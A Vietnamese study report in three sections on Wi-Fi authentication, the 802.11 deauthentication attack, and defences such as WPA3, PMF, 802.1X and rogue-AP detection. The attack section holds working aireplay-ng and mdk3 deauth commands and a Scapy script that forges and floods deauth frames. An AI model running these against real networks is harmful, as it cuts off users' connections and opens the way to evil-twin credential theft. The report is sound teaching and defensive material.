# 1️⃣ Giới thiệu về WiFi & Cơ chế xác thực (Người 1)
## WiFi hoạt động như thế nào?
- Wi-Fi là một công nghệ không dây dùng để kết nối mạng, vì vậy nó sử dụng sóng điện từ để truyền tải mạng. Chúng ta biết rằng sóng điện từ có nhiều loại khác nhau dựa trên tần số của chúng, chẳng hạn như tia X, tia Gamma, sóng vô tuyến, sóng vi ba, v.v. Trong Wi-Fi, tần số sóng vô tuyến được sử dụng. Để truyền tín hiệu Wi-Fi, có ba phương thức chính:
    - Mạng trạm gốc hoặc kết nối Ethernet (802.3): Đây là mạng chủ chính cung cấp kết nối mạng cho bộ định tuyến (router).
Điểm truy cập hoặc bộ định tuyến (Access Point / Router): Đây là cầu nối giữa mạng có dây và mạng không dây. Nó nhận kết nối Ethernet có dây, sau đó chuyển đổi thành kết nối không dây và phát tín hiệu dưới dạng sóng vô tuyến.
    - Thiết bị truy cập: Đây là các thiết bị như điện thoại di động, máy tính, v.v., mà chúng ta sử dụng để kết nối Wi-Fi và lướt Internet.
    - Tất cả các thiết bị điện tử đều đọc dữ liệu dưới dạng nhị phân, bao gồm cả bộ định tuyến và thiết bị của chúng ta. Bộ định tuyến phát sóng vô tuyến, và các thiết bị nhận sóng này, sau đó chuyển đổi thành dữ liệu nhị phân. Sóng có hình dạng dao động, trong đó đỉnh sóng được biểu thị là 1 và đáy sóng được biểu thị là 0 trong hệ nhị phân, như minh họa dưới đây:
- Một số thuật ngữ quan trọng trong Wi-Fi:
    - SSID (Service Set Identifier): Đây là một chuỗi ký tự dài tối đa 32 ký tự dùng để nhận diện mạng Wi-Fi và phân biệt mạng này với mạng khác. Mọi thiết bị muốn kết nối đều phải tìm kiếm SSID cụ thể. SSID chính là tên của mạng không dây.
    - WPA-PSK (Wi-Fi Protected Access - Pre-Shared Key): Đây là chương trình được phát triển bởi Wi-Fi Alliance nhằm bảo vệ mạng không dây bằng phương thức xác thực bằng khóa chia sẻ trước (Pre-Shared Key). WPA có ba phiên bản chính: WPA, WPA2 và WPA3, giúp mã hóa tín hiệu Wi-Fi để ngăn chặn người dùng không mong muốn truy cập trái phép.

---


- Các chế độ hoạt động của WiFi: Infrastructure Mode vs. Ad-hoc Mode.
    - Mạng cơ sở hạ tầng (Infrastructure networks): Đây là loại mạng không dây phổ biến nhất, bao gồm một điểm truy cập không dây (wireless access point) được kết nối với Internet và một nhóm thiết bị kết nối với điểm truy cập đó.
    - Mạng Ad-hoc: Còn được gọi là mạng ngang hàng (peer-to-peer networks), đây là loại mạng bao gồm một nhóm thiết bị có thể giao tiếp trực tiếp với nhau mà không cần một điểm truy cập trung tâm.
---

## Quá trình xác thực & kết nối giữa client và Access Point (AP).

![image](https://hackmd.io/_uploads/HJyI9vg2yg.png)
![image](https://hackmd.io/_uploads/S1dL9we3Jl.png)

- Passive scanning: Thiết bị khách sẽ lắng nghe các tín hiệu radio từ các AP trong khu vực. Các AP thường phát sóng các khung tin (beacon frames) định kỳ để thông báo sự hiện diện của chúng.

    - Thông tin khả năng: Chứa thông tin về khả năng của thiết bị/mạng
    - Dấu thời gian: Sau khi nhận được khung beacon, tất cả các trạm sẽ cập nhật đồng hồ cục bộ của chúng bằng dấu thời gian này. Điều này giúp đồng bộ hóa.
    - Khoảng thời gian Beacon: Biểu thị số Đơn vị thời gian (TU) giữa Thời gian truyền Beacon mục tiêu (TBTT). Giá trị mặc định là 100TU (102,4 mili giây).
    - SSID: Chứa ID bộ dịch vụ của mạng.

- Active scan (quét chủ động) trong mạng Wi-Fi là một phương pháp mà thiết bị khách (client) sử dụng để phát hiện các mạng không dây bằng cách gửi yêu cầu đến các access point (AP) và chờ phản hồi. 
- Cách Thức Hoạt Động:
    - Gửi Yêu Cầu Probe: Thiết bị khách gửi một hoặc nhiều yêu cầu probe (probe request) đến các kênh không dây. Yêu cầu này có thể bao gồm SSID của mạng mà thiết bị khách đang tìm kiếm hoặc có thể để trống để tìm kiếm tất cả các mạng khả dụng.
![image](https://hackmd.io/_uploads/rktNjwg3Jg.png)
    - Chờ Phản Hồi: Sau khi gửi yêu cầu probe, thiết bị khách sẽ lắng nghe các phản hồi từ các AP trong khu vực. Các AP sẽ gửi lại các khung tin probe response, chứa thông tin về mạng của chúng.
- Thông Tin Nhận Được: Các khung tin probe response chứa thông tin quan trọng như:
    - SSID (Service Set Identifier): Tên của mạng Wi-Fi.
    - Thông tin về loại bảo mật (WPA, WPA2, WPA3, v.v.).
    - Thông tin về kênh mà AP đang sử dụng.
    - Thông tin về tốc độ truyền dữ liệu và các thông số khác
- Authentication: 
![image](https://hackmd.io/_uploads/rkg0RsDxhyx.png)
    - Authentication Algorithm Number: Trường này xác định thuật toán xác thực được sử dụng trong quá trình xác thực.
        - Open System Authentication (Xác thực Hệ thống Mở) - Đây là phương pháp xác thực đơn giản, không yêu cầu bất kỳ thông tin xác thực nào từ client. Client có thể kết nối ngay lập tức với AP.
        - Shared Key Authentication (Xác thực Khóa Chung) - Phương pháp này yêu cầu client và AP phải chia sẻ một khóa bí mật. Client sẽ phải chứng minh rằng nó biết khóa này thông qua một quy trình xác thực.
    - Authentication Transaction Sequence Number: Trường này chỉ định trạng thái hiện tại của quá trình xác thực. Nó giúp theo dõi tiến trình của quá trình xác thực giữa client và AP. Giá trị này thường bắt đầu từ 1 và tăng lên theo từng bước trong quy trình xác thực. Ví dụ, trong quá trình xác thực bằng khóa chung, có thể có nhiều bước, và trường này sẽ cho biết client đang ở bước nào.
     - Status Code: Trường này cho biết kết quả của quá trình xác thực.
         - 0: Success (Thành công) - Điều này có nghĩa là quá trình xác thực đã hoàn tất thành công và client có thể kết nối với AP.
         - 1: Unspecified failures (Lỗi không xác định) - Điều này có nghĩa là có một lỗi xảy ra trong quá trình xác thực, nhưng không có thông tin cụ thể nào được cung cấp về lỗi đó.
    - Challenge Text: Trường này chỉ được sử dụng trong khung xác thực khóa chung (Shared Key Authentication). Nó chứa một chuỗi thách thức (challenge) mà AP gửi đến client. Client sẽ phải mã hóa chuỗi thách thức này bằng khóa chung mà nó chia sẻ với AP và gửi lại cho AP. AP sẽ kiểm tra xem phản hồi của client có đúng hay không để xác thực client.
- Association Request (Yêu cầu Kết nối) là một khung tin (frame) trong giao thức Wi-Fi (802.11) được sử dụng bởi client (thiết bị khách) để yêu cầu kết nối với một access point (AP) sau khi quá trình xác thực đã thành công. Đây là bước quan trọng trong quy trình kết nối giữa client và AP. Dưới đây là một số thông tin chi tiết về Association Request:
![image](https://hackmd.io/_uploads/BJ0mlYx2yg.png)
- Nội Dung của Association Request: Khung tin này chứa nhiều trường thông tin quan trọng, bao gồm:
    - Destination Address: Địa chỉ MAC của AP mà client muốn kết nối.
    - Source Address: Địa chỉ MAC của client.
    - BSSID: Địa chỉ MAC của AP (có thể giống với Destination Address).
    - SSID: Tên của mạng Wi-Fi mà client muốn kết nối.
    - Capability Information: Thông tin về khả năng của client, chẳng hạn như hỗ trợ các chế độ bảo mật khác nhau.
- Association response: Sau khi yêu cầu liên kết được xác nhận, AP sẽ kiểm tra từng trường của yêu cầu và xác minh rằng tất cả chúng đều khớp với các tham số 802.11 của chính nó (tham khảo Hình 6). Trong trường hợp tham số không khớp, AP sẽ kiểm tra xem sự khác biệt có phải là chặn hay không và dựa trên đó, AP sẽ gửi phản hồi xác thực.
- Nếu sự khác biệt về tham số là chặn, thì phản hồi với mã trạng thái 1 sẽ được gửi (để từ chối liên kết).
- Trong trường hợp sự khác biệt không chặn/Không có sự khác biệt về tham số, phản hồi với mã trạng thái 0 (thành công) và các tham số riêng của AP sẽ được gửi đến client.
 ![image](https://hackmd.io/_uploads/By9wNtenyl.png)


https://community.nxp.com/t5/Wi-Fi-Bluetooth-802-15-4/802-11-Wi-Fi-Connection-Disconnection-process/ta-p/1121148
- Giải thích về Management Frames và vai trò của Deauthentication Frame.
Management frames are used to manage the BSS. This includes probing, associating, roaming, and disconnecting clients from the BSS.
![image](https://hackmd.io/_uploads/HyT9EYg2Jl.png)
- De-authentication Frame (khung hủy xác thực) trong giao thức IEEE 802.11 (Wi-Fi) có vai trò quan trọng trong việc quản lý kết nối giữa thiết bị (client) và điểm truy cập (access point). Dưới đây là một số vai trò chính của De-authentication Frame:
    - Ngắt Kết Nối: De-authentication Frame được sử dụng để thông báo rằng một thiết bị đã bị ngắt kết nối khỏi mạng. Điều này có thể xảy ra khi người dùng chọn ngắt kết nối, khi thiết bị di chuyển ra ngoài vùng phủ sóng, hoặc khi điểm truy cập quyết định ngắt kết nối thiết bị vì lý do nào đó.
    - Bảo Mật Mạng: Khung này có thể được sử dụng để bảo vệ mạng khỏi các mối đe dọa. Nếu một thiết bị bị phát hiện có hành vi đáng ngờ hoặc không hợp lệ, điểm truy cập có thể gửi De-authentication Frame để ngắt kết nối thiết bị đó, giúp bảo vệ mạng khỏi các cuộc tấn công hoặc truy cập trái phép.
    - Quản Lý Tài Nguyên: Khi một thiết bị không còn cần thiết để kết nối, việc gửi De-authentication Frame giúp giải phóng tài nguyên mạng. Điều này cho phép các thiết bị khác có thể kết nối và sử dụng băng thông mạng một cách hiệu quả hơn.
    - Thông báo cho Thiết bị: Khi một thiết bị nhận được De-authentication Frame, nó sẽ biết rằng nó đã bị ngắt kết nối và có thể thực hiện các hành động cần thiết, chẳng hạn như tìm kiếm lại các mạng có sẵn hoặc thông báo cho người dùng về việc ngắt kết nối.
    - Hỗ trợ trong quá trình chuyển tiếp: Trong các mạng lớn, khi một thiết bị di chuyển từ một điểm truy cập này sang một điểm truy cập khác, De-authentication Frame có thể được sử dụng để thông báo rằng thiết bị đã bị ngắt kết nối khỏi điểm truy cập cũ trước khi kết nối với điểm truy cập mới.


# 2️⃣ Deauthentication Attack là gì? (Người 2)
## 2.1. Định nghĩa & Nguyên lý hoạt động

**Deauthentication Attack** là một kỹ thuật tấn công nhằm phá vỡ kết nối giữa client và Access Point (AP) bằng cách gửi các **deauthentication frames** giả mạo. Theo tiêu chuẩn IEEE 802.11, các khung quản lý như deauthentication không được mã hóa hoặc xác thực, do đó dễ bị giả mạo.

- **Cách thức hoạt động:**  
  Khi một client kết nối với AP, các gói tin quản lý được sử dụng để duy trì và quản lý kết nối. Trong đó, **deauthentication frame** được dùng để thông báo rằng phiên kết nối giữa client và AP đã bị hủy. Kẻ tấn công khai thác lỗ hổng này bằng cách gửi liên tục các gói deauth giả mạo, khiến client tin rằng AP đã chấm dứt phiên làm việc, buộc client phải ngắt kết nối và tiến hành quá trình xác thực lại.

- **Ví dụ thực tiễn:**  
  Giả sử có một AP với BSSID là `00:11:22:33:44:55` và một client với MAC `66:77:88:99:AA:BB`. Kẻ tấn công gửi deauth frame từ địa chỉ của AP đến client, khiến thiết bị của client ngắt kết nối. Điều này không chỉ gây gián đoạn dịch vụ mà còn tạo điều kiện cho các tấn công tiếp theo (ví dụ: Evil Twin).

## 2.2. Cấu trúc của Gói tin trong WiFi

### 2.2.1. Gói tin WiFi Thông Thường

Trong mạng WiFi, có ba loại gói tin chính:
- **Management Frames:**  
  Bao gồm Beacon, Probe Request/Response, Authentication, Association Request/Response, v.v.  
  Ví dụ, một Beacon frame thông thường của AP có cấu trúc:
  ```
  +--------------------+
  | Radiotap Header    |
  +--------------------+
  | Frame Control      | 2 bytes (cho Beacon)
  +--------------------+
  | Duration           | 2 bytes
  +--------------------+
  | Address 1          | 6 bytes (Broadcast MAC)
  +--------------------+
  | Address 2          | 6 bytes (MAC của AP)
  +--------------------+
  | Address 3          | 6 bytes (BSSID)
  +--------------------+
  | Sequence Control   | 2 bytes
  +--------------------+
  | Frame Body         | Các IE (Information Elements) như SSID, Supported Rates, v.v.
  +--------------------+
  | FCS                | 4 bytes
  +--------------------+
  ```

- **Control Frames:**  
  Bao gồm ACK, RTS/CTS, v.v.

- **Data Frames:**  
  Chứa dữ liệu truyền tải giữa client và AP (thường được mã hóa nếu sử dụng WPA2/WPA3).

### 2.2.2. Format của Gói tin Deauthentication

Gói tin Deauthentication là một loại Management Frame đặc biệt với mục đích thông báo hủy kết nối. Cấu trúc điển hình của gói tin Deauthentication như sau:

```
+--------------------+
| Radiotap Header    |  (Thông tin về môi trường không dây – độ dài biến đổi)
+--------------------+
| Frame Control      | 2 bytes (Xác định loại frame, ví dụ: 0xC0 0x00 cho Deauthentication)
+--------------------+
| Duration           | 2 bytes
+--------------------+
| Address 1          | 6 bytes (Địa chỉ MAC của client nhận)
+--------------------+
| Address 2          | 6 bytes (Địa chỉ MAC của AP – nguồn gốc giả mạo)
+--------------------+
| Address 3          | 6 bytes (BSSID, thường giống với Address 2)
+--------------------+
| Sequence Control   | 2 bytes
+--------------------+
| Frame Body         |  (Chứa nội dung của khung quản lý)
| - Reason Code      | 2 bytes (Ví dụ: 0x0007, “Class 3 frame received from nonassociated station”)
+--------------------+
| FCS                | 4 bytes (Frame Check Sequence – dùng để kiểm tra lỗi)
+--------------------+
```

#### Giải thích các trường quan trọng:
- **Radiotap Header:** Cung cấp thông tin phụ về kênh, tốc độ, cường độ tín hiệu, v.v.
- **Frame Control:** Xác định loại frame (management, control, data); với Deauthentication, trường này báo hiệu đây là gói quản lý hủy kết nối.
- **Duration:** Thời gian dành cho phiên truyền dữ liệu của gói tin.
- **Address 1, 2, 3:**  
  - **Address 1:** MAC của client nhận.
  - **Address 2:** MAC của AP (giả mạo khi tấn công).
  - **Address 3:** BSSID của mạng (thường giống với Address 2).
- **Frame Body – Reason Code:** Xác định lý do hủy kết nối (ví dụ: reason code 7).
- **FCS:** Dùng để kiểm tra lỗi dữ liệu của gói tin.

## 2.3. Quá trình Chuyển đổi Gói tin WiFi Thông Thường sang Gói tin Deauthentication

1. **Thu thập gói tin thông thường:**  
   - Dùng công cụ như **airodump-ng** để bắt các gói tin Beacon, Authentication, Association từ AP.
   - Xác định các trường cần thiết như địa chỉ MAC của AP, client, kênh hoạt động, v.v.

2. **Tạo và chỉnh sửa gói tin:**  
   - Dựa trên gói tin thông thường, kẻ tấn công sẽ tạo một gói tin mới với cấu trúc tương tự.  
   - Chỉnh sửa **Frame Control** để báo hiệu đây là Deauthentication frame (ví dụ: 0xC0 0x00).
   - Gán **Address 1** là MAC của client mục tiêu, **Address 2** và **Address 3** là MAC của AP.
   - Thêm **Reason Code** (ví dụ: 7 – “Class 3 frame received from nonassociated station”) vào Frame Body.

3. **Gửi gói tin:**  
   - Gửi liên tục gói tin Deauthentication qua giao diện đã chuyển sang chế độ monitor, nhằm đảm bảo client nhận được và buộc phải ngắt kết nối.

## 2.4. Cách khai thác lỗ hổng trong IEEE 802.11

- **Thiếu bảo vệ cho các khung quản lý:**  
  Các khung tin quản lý như deauthentication không được bảo vệ bằng mã hóa hoặc xác thực, tạo cơ hội cho kẻ tấn công tạo ra các gói tin giả mạo.

- **Quá trình tấn công chi tiết:**  
  1. **Khảo sát (Reconnaissance):**  
     - Sử dụng **airodump-ng** để quét mạng, xác định AP mục tiêu, kênh hoạt động và danh sách client.
     - *Ví dụ:* Phát hiện AP `00:11:22:33:44:55` trên kênh 6 với client `66:77:88:99:AA:BB`.

  2. **Giả mạo và tạo gói tin:**  
     - Cấu tạo gói tin Deauthentication dựa trên thông tin thu thập được, bao gồm địa chỉ MAC của client và AP cùng với Reason Code.

  3. **Gửi gói tin liên tục:**  
     - Gửi liên tục các gói tin Deauthentication để duy trì trạng thái ngắt kết nối cho client.

## 2.5. So sánh với Disassociation Attack

Mặc dù cả Deauthentication Attack và Disassociation Attack đều nhằm phá vỡ kết nối giữa client và AP, chúng có điểm khác biệt về cơ chế và tác động:

| **Tiêu chí**             | **Deauthentication Attack**                                                                                                  | **Disassociation Attack**                                                                                   |
|--------------------------|-----------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------|
| **Khung tin sử dụng**    | **Deauthentication Frame:** Thông báo hủy kết nối và xóa thông tin phiên.                                                    | **Disassociation Frame:** Thông báo yêu cầu client rời khỏi BSS nhưng không xóa toàn bộ thông tin phiên.      |
| **Mục đích**             | Buộc client đăng nhập lại, gây gián đoạn liên tục và tạo cơ hội cho tấn công nâng cao (ví dụ: Evil Twin).                       | Ngắt kết nối tạm thời; client có thể tự động kết nối lại mà không cần quá trình đăng nhập lại đầy đủ.         |
| **Tác động đến kết nối** | Gây ra mất kết nối nghiêm trọng, yêu cầu client phải trải qua lại quá trình xác thực.                                        | Gây gián đoạn ngắn hạn, client có thể phục hồi kết nối tự động.                                             |
| **Khả năng phục hồi**     | Yêu cầu quá trình xác thực lại đầy đủ, làm giảm trải nghiệm người dùng.                                                     | Cho phép client khôi phục kết nối nhanh chóng.                                                             |
| **Ví dụ thực tiễn**      | Sử dụng **aireplay-ng** để gửi 10 gói deauth, buộc client đăng nhập lại hoàn toàn.                                         | Gửi disassociation frame khiến client mất kết nối nhưng nhanh chóng tái kết nối nếu có sẵn.                    |

## 2.6. Công cụ Thực hiện và Ví dụ Cụ thể

### 2.6.1. aireplay-ng

- **Mô tả:**  
  Aireplay-ng thuộc bộ Aircrack-ng suite, cho phép gửi các gói tin tùy chỉnh, bao gồm cả deauthentication frame, nhằm kiểm tra bảo mật của mạng WiFi.

- **Ví dụ lệnh:**  
  ```bash
  aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon
  ```
  - **Giải thích:**  
    - `--deauth 10`: Gửi 10 gói tin deauthentication.
    - `-a 00:11:22:33:44:55`: Địa chỉ MAC của AP mục tiêu.
    - `-c 66:77:88:99:AA:BB`: Địa chỉ MAC của client mục tiêu.
    - `wlan0mon`: Giao diện chuyển sang chế độ monitor.

### 2.6.2. MDK3

- **Mô tả:**  
  MDK3 là công cụ tấn công mạng không dây mạnh mẽ, hỗ trợ nhiều chế độ tấn công, trong đó có deauthentication.

- **Ví dụ lệnh:**  
  ```bash
  mdk3 wlan0mon d -c 6 -b 00:11:22:33:44:55
  ```
  - **Giải thích:**  
    - `d`: Chế độ tấn công deauthentication.
    - `-c 6`: Kênh hoạt động của AP.
    - `-b 00:11:22:33:44:55`: Địa chỉ MAC của AP mục tiêu.
  - **Lưu ý:**  
    Tham khảo tài liệu của MDK3 để điều chỉnh tham số cho phù hợp với mục tiêu.

### 2.6.3. Scapy

- **Mô tả:**  
  Scapy là thư viện Python mạnh mẽ, cho phép xây dựng và thao tác với các gói tin tùy chỉnh, hữu ích cho nghiên cứu và kiểm thử bảo mật.

- **Ví dụ mã nguồn:**  
  ```python
  from scapy.all import *

  # Cấu hình thông tin
  client_mac = "66:77:88:99:AA:BB"
  ap_mac = "00:11:22:33:44:55"
  iface = "wlan0mon"

  # Tạo gói Beacon thông thường (để phân tích cấu trúc)
  beacon_frame = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac)/Dot11Beacon()/Dot11Elt(ID="SSID", info="ExampleAP")
  print("Thông tin gói Beacon:")
  beacon_frame.show()

  # Tạo gói tin Deauthentication dựa trên thông tin từ Beacon
  dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
  deauth_frame = RadioTap()/dot11/Dot11Deauth(reason=7)
  print("Thông tin gói Deauthentication:")
  deauth_frame.show()

  # Gửi gói tin Deauthentication liên tục để tấn công
  sendp(deauth_frame, iface=iface, count=100, inter=0.1)
  ```
  - **Giải thích:**  
    - Đoạn mã đầu tiên minh họa cách tạo một Beacon frame để nắm bắt cấu trúc gói tin thông thường.
    - Sau đó, sử dụng thông tin của Beacon (địa chỉ MAC của AP) để xây dựng gói tin Deauthentication với Reason Code 7.
    - Cuối cùng, gói tin Deauthentication được gửi liên tục qua giao diện monitor để thực hiện tấn công.

# 3️⃣ Cách phòng chống tấn công Deauthentication (Người 3)
WPA3 và Protected Management Frames (PMF).
## WPA3
-    WPA là từ viết tắt cho Wi-Fi Protected Access, nó là một chứng chỉ bảo mật do Wi-Fi Alliance tạo ra để bảo vệ các kết nối không dây. Bạn có thể hiểu đơn giản rằng WPA là một bộ quy tắc được thiết kế để giúp bảo vệ bộ định tuyến Wi-Fi nhà mình, các thiết bị mà nó kết nối tới cùng những dữ liệu được truyền đi. Nhờ vào một lớp liên lạc trung gian, hai thiết bị đầu và cuối sẽ không cần phải biết được các thông tin "bí mật" của nhau.

-    WPA2 đang là chuẩn bảo mật được sử dụng ở nước ta hiện tại. Nó được ra mắt vào năm 2004 và là một bước cải tiến lớn so với những gì mà chúng ta phải sử dụng trước đó, song nó đã dần bộc lộ những điểm lỗi thời sau 14 năm hoạt động. Do đó, WPA3 được ra đời để giúp khắc phục những yếu điểm cần được thay thế của phiên bản tiền nhiệm.

-    Giao thức bảo mật mới cung cấp một số cải tiến lớn cho các thiết bị có hỗ trợ Wi-Fi về cấu hình, xác thực và tăng cường mã hóa, khiến hacker khó tấn công WiFi hoặc rình mò mạng của bạn hơn. Wi-Fi Alliance đã giới thiệu hai loại của giao thức bảo mật mới nhất - WPA3-Personal và WPA3-Enterprise - cho các mạng không dây cá nhân, doanh nghiệp và IoT.

### WPA3-Personal
-    WPA3-Personal (WPA3-SAE): Chế độ này tập trung cải thiện bảo mật cho người dùng cá nhân bằng cách sử dụng Simultaneous Authentication of Equals (SAE). So với WPA2, SAE giúp tăng cường mã hóa ngay cả khi người dùng đặt mật khẩu đơn giản.
### WPA3-Enterprise
-    WPA3-Enterprise: Đây là bản nâng cấp từ WPA2-Enterprise, được thiết kế cho các tổ chức và doanh nghiệp. Chế độ này yêu cầu Protected Management Frames (PMF) trên tất cả các kết nối, hỗ trợ nhiều phương thức xác thực EAP và cung cấp mã hóa mạnh hơn với 128-bit authenticated encryption, 256-bit key derivation & confirmation, cùng 128-bit PMF để bảo vệ dữ liệu quan trọng.
    -    TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384: ECDHE và ECDSA sử dụng số nguyên tố 384-bit
    -    TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384: ECDHE sử dụng số nguyên tố 384-bit; số module RSA ≥ 3072-bit
    -    TLS_DHE_RSA_WITH_AES_256_GCM_SHA384: số module RSA ≥ 3072-bit và DHE ≥ 3072-bit.

## Protected Management Frames (PMF)
-    Trước khi PMF được triển khai, một khung quản lý (Management Frame) trong Wi-Fi có cấu trúc đơn giản:
    -    ![image](https://hackmd.io/_uploads/rJGXoOe21g.png)
    -    802.11 hdr: Phần tiêu đề của giao thức 802.11, chứa thông tin về địa chỉ MAC, loại khung, v.v.
    -    Mgmt frame body: Dữ liệu thực tế của khung quản lý.
    -    FCS (Frame Check Sequence): Dùng để kiểm tra lỗi dữ liệu khi truyền.

--> Không có mã hóa hoặc xác thực, hacker có thể giả mạo khung quản lý để thực hiện các cuộc tấn công như Deauthentication Attack.

Khi PMF được kích hoạt, khung quản lý sẽ có thêm các cơ chế bảo mật để ngăn chặn giả mạo và tấn công.

-    Cấu trúc mới bao gồm:
    -    802.11 hdr: Vẫn giữ nguyên như trước.
    -    Management frame body: Chứa thông tin quản lý của mạng Wi-Fi.
    -    MIC IE (Message Integrity Check Information Element):Chứa Mã Xác Thực Toàn Vẹn (MIC - Message Integrity Code), giúp xác minh rằng khung quản lý không bị giả mạo được tính toán dựa trên khóa bảo mật giữa thiết bị và điểm truy cập.
    -    FCS (Frame Check Sequence): Vẫn có để kiểm tra lỗi dữ liệu.
--> Khi đó sẽ bảo vệ các Management Frames khỏi các cuộc tấn công giả mạo (spoofing) hoặc từ chối dịch vụ (DoS). PMF giúp tăng cường bảo mật mạng không dây bằng cách đảm bảo rằng các khung quản lý quan trọng được mã hóa và xác thực.

## 802.1X Authentication với Radius Server.
![image](https://hackmd.io/_uploads/BylNjulnJg.png)



-    Trong WPA người dùng có thể được xác thực thông qua một máy chủ xác thực IEEE 802.1X(thường là một máy chủ RADIUS).

-    Ba thành phần chính trong 802.1X
    -    Supplicant (Máy khách - Thiết bị người dùng)
        Đây là thiết bị muốn kết nối vào mạng.
        Supplicant cũng có thể là phần mềm chạy trên thiết bị, giúp gửi thông tin xác thực đến Authenticator.
        Thông tin xác thực có thể là username/password hoặc chứng chỉ số.
    -    Authenticator (Bộ kiểm soát - Switch/AP Wi-Fi)
    Là thiết bị trung gian giúp kiểm soát truy cập.
    Ví dụ: Switch Ethernet hoặc Access Point Wi-Fi.
    Không tự xác thực người dùng, mà chỉ chuyển tiếp yêu cầu đến Authentication Server.
    Có thể chặn hoặc cấp quyền truy cập tùy theo kết quả xác thực.
    -    Authentication Server (Máy chủ xác thực - RADIUS Server)
    Chạy phần mềm hỗ trợ RADIUS và EAP để xử lý yêu cầu xác thực.
    Xác minh danh tính dựa trên thông tin từ Supplicant.
    Nếu xác thực thành công, sẽ cấp quyền truy cập vào mạng.
    Nếu xác thực thất bại, thiết bị sẽ bị từ chối truy cập.


-    Quy trình xác thực chi tiết
    -    Supplicant gửi yêu cầu kết nối: Thiết bị người dùng cố gắng kết nối với mạng.
    -    Authenticator yêu cầu thông tin đăng nhập: Gửi thông điệp yêu cầu Supplicant cung cấp username/password hoặc chứng chỉ số.
    -    Supplicant phản hồi: Gửi thông tin xác thực đến Authenticator.
    -    Authenticator chuyển thông tin đến Authentication Server (qua giao thức RADIUS).
    -    Authentication Server kiểm tra thông tin:
    Nếu hợp lệ ➝ gửi tín hiệu Access-Accept ➝ cho phép truy cập.
    Nếu không hợp lệ ➝ gửi tín hiệu Access-Reject ➝ chặn truy cập.
    -    Authenticator cấp quyền truy cập nếu xác thực thành công.
## Kismet - IDS phát hiện tấn công deauth.

![Untitled](https://hackmd.io/_uploads/SyqtJkM3ke.png)

## Sử dụng Rogue AP Detection để phát hiện AP giả mạo.
-    Access Point Rogue (hay còn gọi là Rogue AP) là một điểm truy cập Wi-Fi trái phép hoặc không được quản lý trong mạng của một tổ chức. Đây có thể là một thiết bị Wi-Fi được cắm vào mạng nội bộ mà không có sự cho phép của quản trị viên, gây ra các rủi ro bảo mật nghiêm trọng.
-    Access Point Rogue thường kết hợp với deauthentication attack. Attacker cần 2 card wifi. 1 card dùng để ngắt quyền truy cập client bằng cách gửi deauthentication frame. Card còn lại dùng để tạo AP giả để dụ victim vào AP giả của mình.

![image](https://hackmd.io/_uploads/Syt4o_l3ye.png)


-    Cách kiểm tra Rouge AP chỉ có cách là kiểm tra địa chỉ MAC của AP đó. Thế nên cần phải có danh sách những địa chỉ MAC đã đăng ký trên Router/Switch. Nếu địa chỉ MAC không có trong danh sách đó, thì đó có thể là Rouge AP.
-    Bật chế độ monitor của card wifi, sử dụng thư viên scapy của python để quét và kiểm tra
```python3=
from scapy.all import *
import os
import sys
from threading import Thread


CHANNELS = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]
def switch_channel():
    while True:
        for ch in CHANNELS:
            os.system(f'iwconfig {sys.argv[1]} channel {ch}')
            time.sleep(0.5)

# https://standards-oui.ieee.org/oui/oui.txt
vendors = open('oui.txt', 'r').read()
def check_network(ssid, bssid, signal_strength, channel, enc):
    if bssid[:8].upper().replace(':', '') not in vendors:
        rogue = "⚠️  Susspect"
    else:
        rogue = "✅ Credible"
    print(f"{ssid[:15]:15}\t{bssid}\t{signal_strength}\t{channel}\t{enc}\t{rogue}")

# Danh sách lưu thông tin các AP
wifi_networks = []
def sniffer(packet):
    global wifi_networks
    if packet.haslayer(Dot11Beacon):  # Kiểm tra gói tin quảng bá SSID của AP
        bssid = packet[Dot11].addr2  # Địa chỉ MAC AP (BSSID)
        ssid = packet[Dot11Elt].info.decode(errors="ignore")  # Tên Wi-Fi (ESSID)

        try:
            signal_strength = packet.dBm_AntSignal  # Mức tín hiệu (PWR)
        except:
            signal_strength = "N/A"

        # Kiểm tra kiểu mã hóa (WPA, WPA2, WEP)
        enc = "Open"
        if packet.haslayer(Dot11EltRSN):
            enc = "WPA2"
        elif packet.haslayer(Dot11WEP):
            enc = "WEP"
        elif packet.haslayer(Dot11Elt) and b"\x00\x0f\xac" in packet[Dot11Elt].info:
            enc = "WPA"

        # Lấy kênh Wi-Fi (CH)
        channel = None
        dot11elt = packet.getlayer(Dot11Elt)
        while dot11elt:
            if dot11elt.ID == 3:  # Tag Number 3 là kênh
                channel = ord(dot11elt.info)
                break
            dot11elt = dot11elt.payload

        if (ssid, bssid) not in wifi_networks:
            wifi_networks.append((ssid, bssid))
            check_network(ssid, bssid, signal_strength, channel, enc)

if __name__=='__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <interface_monitor>')
        exit(0)

    # Kiểm tra nếu đang chạy trên Windows thì báo lỗi
    if os.name == "nt":
        print("⚠️ Windows detected! Please use Kali Linux with adapter support Monitor mode!")
    else:
        print("📡 Scanning for Rouge AP...\nPress Ctrl+C to stop!")
        t = Thread(target=switch_channel)
        t.daemon = True
        t.start()


        print("\n🔍 List of wifi detected:")
        print("SSID\t\tBSSID\t\t\tPWR\tCH\tENC\t⚠️  Rogue AP?")
        print("--------------------------------------------------------------------------------")

        sniff(iface=sys.argv[1], prn=sniffer, store=0, timeout=30)  # Quét trong 30 giây
```

![image](https://hackmd.io/_uploads/SkWBiuenyx.png)


-    Cách chống Rogue Access Point ở nơi công cộng:
    -    Tránh kết nối wifi công cộng không mật khẩu (Open wifi)
    -    Sử dụng VPN để mã hóa thông tin, tránh hacker có thể bắt được các gói tin chưa mã hóa.
    -    Sử dụng dữ liệu di động thay vì Wifi công cộng.


## Cách bảo vệ mạng cá nhân: Tắt SSID Broadcast, Giới hạn MAC Address.
### Tắt SSID Broadcast

![image](https://hackmd.io/_uploads/ByDSjOg3yg.png)


### Giới hạn MAC Address

-    Chặn địa chỉ mac
![image](https://hackmd.io/_uploads/r1JLj_xnkx.png)


-    Allow những địa chỉ mac uy tín
![image](https://hackmd.io/_uploads/S1HUoux2kg.png)


